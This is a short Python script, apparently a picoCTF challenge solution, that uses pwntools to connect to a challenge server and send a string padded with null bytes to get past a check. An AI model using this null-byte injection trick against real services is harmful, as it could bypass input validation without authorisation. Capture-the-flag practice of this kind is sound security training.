from pwn import *
HOST = "mars.picoctf.net"
PORT = 31689
with remote(HOST, PORT) as r:
    r.send(b"test\00\00")
    print(r.recv().decode())